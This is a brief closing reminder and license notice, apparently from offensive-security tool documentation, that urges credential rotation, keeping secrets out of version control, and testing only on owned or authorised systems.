> **Reminder:** rotate every credential shown in the source documents, keep secrets out of version control, and only ever point these tools at systems you own or are written-authorised to test.

**License:** Documentation is provided for educational use. The offensive techniques are for isolated, authorised lab environments only.
